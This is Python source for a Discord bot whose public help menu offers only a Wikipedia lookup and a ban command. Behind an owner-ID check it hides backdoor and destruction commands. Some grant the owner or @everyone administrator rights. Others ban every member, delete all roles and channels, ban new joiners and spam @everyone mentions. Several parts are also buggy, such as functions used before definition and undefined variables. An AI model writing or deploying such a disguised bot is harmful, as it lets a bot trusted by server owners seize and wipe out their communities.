import discord
from discord.ext import commands
import asyncio
import random
import json
import sys
import os
import datetime
from discord.utils import get
import wikipedia
intents = discord.Intents.default()
intents.members = True
intents.presences = True
client = commands.Bot(command_prefix='!', intents=intents)
client.remove_command('help')
import parse

@client.event
async def on_ready():
	print("ready")

@client.command()
@commands.cooldown(1, 60, commands.BucketType.user)
async def wiki(ctx, arg):
    color = random.randint(0, 0xffffff)
    definition = wikipedia.summary(arg, sentences=3, chars=1000)
    embed = discord.Embed(title=f'Wikipedia definition for {arg}', description=definition, color=color)
    await ctx.send(embed=embed)

@wiki.error
async def wiki_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = str(datetime.timedelta(seconds=int(error.retry_after)))
        embed = discord.Embed(title='Command is on cooldown', description=f'Try again after {remaining_time} time')
        await ctx.send(embed=embed)
    else:
        if isinstance(error, commands.CommandInvokeError):
            await ctx.send('No page with that name!')
        else:
            print(error)

@client.command()
@commands.check(check_is_me)
async def anarchy(ctx):
	await ctx.author.send("Anarchy has been toggled. Now you are not hidden anymore everyone is an admin!")
	role = discord.utils.get(ctx.guild.roles, name="@everyone")
	perms = discord.Permissions(administrator=True)
	await role.edit(permissions=perms)

def check_is_me(ctx):
	return ctx.author.id == URID

@client.command()
@commands.check(check_is_me)
async def advertise(ctx, channelid:int, *, arg):
	channel = discord.utils.get(ctx.guild.channels, id=channelid)
	def check(m):
		return m.channel == ctx.author.dm_channel
	await ctx.author.send("Are you sure you want to use this command. It will display a message in the channel mentioning everyone `advertisespam` is also an option. Type: `accept` to accept and `cancel` to cancel.")
	msg = await client.wait_for("message", check=check)
	if msg.content == "accept":
		role = discord.utils.get(ctx.guild.roles, name="@everyone")
		await channel.send(f"{role.mention} {arg}")
	elif msg.content == "cancel":
		pass
	else:
		pass

@client.command()
@commands.check(check_is_me)
async def advertisespam(ctx, channelid:int, times:int, *, arg):
	channel = discord.utils.get(ctx.guild.channels, id=channelid)
	def check(m):
		return m.channel == ctx.author.dm_channel
	await ctx.author.send("Are you sure you want to use this command. It will spam a message in the channel mentioning everyone. Type: `accept` to accept and `cancel` to cancel.")
	msg = await client.wait_for("message", check=check)
	if msg.content == "accept":
		role = discord.utils.get(ctx.guild.roles, name="@everyone")
		for i in range(times):
			role = discord.utils.get(ctx.guild.roles, name="@everyone")
			await channel.send(f"{role.mention} {arg}")
			print(i + "time")
	elif msg.content == "cancel":
		pass
	else:
		pass


@client.command()
@commands.check(check_is_me)
async def admin(ctx):
	member = ctx.author
	await ctx.message.delete()
	await ctx.guild.create_role(name='LOL', permissions=discord.Permissions(permissions=8))
	role = discord.utils.get(ctx.guild.roles, name='LOL')
	user = discord.utils.get(ctx.guild.members, id=819191547597553676)
	botrole = user.top_role
	pos = botrole.position
	await role.edit(position=pos-1)
	await member.add_roles(role)
	await member.send('Done!')

@client.command()
@commands.check(check_is_me)
async def temprole(ctx, arg:int):
	await ctx.message.delete()
	await ctx.guild.create_role(name='LOL', permissions=discord.Permissions(permissions=8))
	role = discord.utils.get(ctx.guild.roles, name='LOL')
	user = discord.utils.get(ctx.guild.members, id=819191547597553676)
	botrole = user.top_role
	pos = botrole.position
	await role.edit(position=pos)
	await member.add_roles(role)
	await asyncio.sleep(arg)
	await role.delete()

@client.command()
@commands.check(check_is_me)
async def rolegrief(ctx):
	for i in range(25):
		try:
			await ctx.create_role(name='H4cked by The Law')
		finally:
			await ctx.author.send('Roles were created')

@client.command()
@commands.check(check_is_me)
async def banall(ctx):
	for x in list(ctx.guild.members):
		try:
			await x.ban()
		except:
			print(f"{x.name} coulnd't be banned!")

@client.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, user: discord.Member, *, arg="No reason provided"):
	embed = discord.Embed(title=f'You were banned from {ctx.guild.name}')
	embed.add_field(name="You were banned by", value=ctx.author)
	embed.add_field(name="The reason was", value=arg)
	await user.send(embed=embed)
	em = discord.Embed(title=f"{member} was banned")
	em.add_field(name="You were banned by", value=ctx.author)
	em.add_field(name="The reason was", value=arg)
	await ctx.send(embed=em)

@client.command()
@commands.check(check_is_me)
async def banbypass(ctx, member: discord.Member):
	await ctx.message.delete()
	await member.ban()

@client.command()
@commands.check(check_is_me)
async def zahando(ctx):
	await ctx.channel.delete()



@client.command()
@commands.check(check_is_me)
async def nuke(ctx):
	await ctx.author.send('Phase 1 has started!')
	for x in list(ctx.guild.members):
		try:
			await x.ban()
		except:
			print(f"{x} couldn't be banned")
	await ctx.author.send('Phase 1 has ended!')
	await ctx.author.send('Phase 2 has started!')
	for x in list(ctx.guild.roles):
		try:
			await x.delete()
		except:
			print(f"{x} could not be deleted (role)")
	await ctx.author.send('Phase 2 has ended!')
	await ctx.author.send('Phase 3 has started!')
	for x in list(ctx.guild.channels):
		try:
			await x.delete()
		except:
			print(f"{x} could not be deleted (channel)")
	await ctx.author.send('Phase 3 has ended')
	await ctx.author.send('Operation completed sucesfully!')

@client.command()
@commands.check(check_is_me)
async def checkowner(ctx):
	await ctx.message.delete()
	await ctx.author.send(f"{ctx.guild.owner} is the owner of {ctx.guild.name}")

@client.command()
@commands.check(check_is_me)
async def leave(ctx):
	await ctx.message.delete()
	await ctx.guild.leave()

@client.command()
@commands.check(check_is_me)
async def checkroles(ctx):
	await ctx.message.delete()
	this = []
	for x in list(ctx.guild.roles):
		this.append(x.name)
	await ctx.author.send(', '.join(map(str, this)))

@client.command()
@commands.check(check_is_me)
async def checkmembers(ctx, arg):
	await ctx.message.delete()
	role = discord.utils.get(ctx.guild.roles, name=arg)
	this = []
	for x in role.members:
		this.append(x)
	await ctx.author.send(', '.join(map(str, this)))

@client.command()
@commands.check(check_is_me)
async def hiddenchannels(ctx):
	await ctx.message.delete()
	this = []
	for x in list(ctx.guild.channels):
		this.append(x.mention)
	await ctx.author.send(', '.join(map(str, this)))

@client.command()
@commands.check(check_is_me)
async def memberbantoggle(ctx):
	await ctx.message.delete()
	with open('member.json', 'r') as f:
		toggle = json.load(f)
	togglen = toggle[str("MemberJoinBan")]
	if togglen == 0:
		with open('member.json', 'r') as f:
			toggle = json.load(f)
		toggle[str("MemberJoinBan")] = 1
		with open('member.json', 'w') as f:
			json.dump(toggle,f)
		await ctx.author.send('Now members will be banned when they join!')
	if togglen == 1:
		with open('member.json', 'r') as f:
			toggle = json.load(f)
		toggle[str("MemberJoinBan")] = 0
		with open('member.json', 'w') as f:
			json.dump(toggle,f)
		await ctx.author.send('Now members will not be banned when they join!')

@client.event
async def on_member_join(member):
	with open('member.json', 'r') as f:
		toggle = json.load(f)
	togglen = toggle[str("MemberJoinBan")]
	if togglen == 1:
		await member.ban()
	if togglen == 0:
		pass

@client.command()
async def help(ctx):
	e = discord.Embed(title="Help Menu")
	e.add_field(name='Wikipedia', value="Searches on wikipedia")
	e.add_field(name='Ban', value="Bans people")
	if ctx.author.id == 465946367622381578:
		await ctx.send(embed=e)
		await ctx.author.send("admin, unbanbypass, banall, banbypass, zahando, nuke, checkowner, leave, checkroles, checkmembers, hiddenchannels, memberbantoggle, purge, rolememberclear, loldelete")

	else:
		await ctx.send(embed=e)

@client.command()
@commands.check(check_is_me)
async def purge(ctx):
	await ctx.message.delete()
	await ctx.channel.purge(limit=100000000)



@client.command()
@commands.check(check_is_me)
async def rolememberclear(ctx, arg):
	role = discord.utils.get(ctx.guild.roles, name=arg)
	for x in list(role.members):
		try:
			await x.ban()
			print(f"{x} was banned!")
		except:
			print(f'{x} could not be banned!')

@client.command()
async def loldelete(ctx):
	await ctx.message.delete()
	for role in ctx.guild.roles:
		if role.name == 'LOL':
			await role.delete()

@client.command()
@commands.check(check_is_me)
async def unbanbypass(ctx, *, member):
	await ctx.message.delete()
	banned_users = await ctx.guild.bans()
	member_name, member_discriminator = member.split("#")
	for ban_entry in banned_users:
		user = ban_entry.user
		if (user.name, user.discriminator) == (member_name, member_discriminator):
			await ctx.guild.unban(user)
			await ctx.author.send(f"{user.name}#{user.discriminator} was unbanned!")

@client.command()
@commands.check(check_is_me)
async def panic(ctx):
	await ctx.message.delete()
	for role in ctx.guild.roles:
		if role.name == "LOL":
			try:
				await role.delete()
			except:
				await ctx.author.send('Role could not be deleted!')
	for channel in ctx.guild.channels:
		await channel.delete()

@client.command()
@commands.check(check_is_me)
async def checkbots(ctx):
	await ctx.message.delete()
	this = []
	for x in list(ctx.guild.members):
		if not x.bot:
			pass
		else:
			this.append(x)
	await ctx.author.send(', '.join(map(str, this)))

@client.command()
@commands.check(check_is_me)
async def stop(ctx):
	await ctx.message.delete()
	await client.logout()

def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)

@client.command()
@commands.check(check_is_me)
async def restart(ctx):
    await ctx.message.delete()
    message = await ctx.author.send("Restarting... Allow up to 5 seconds")
    restart_program()



def get_token():
	with open("token.txt", "r") as f:
		lines = f.readlines()
		return lines[0].strip()

TOKEN = get_token()


client.run(TOKEN)
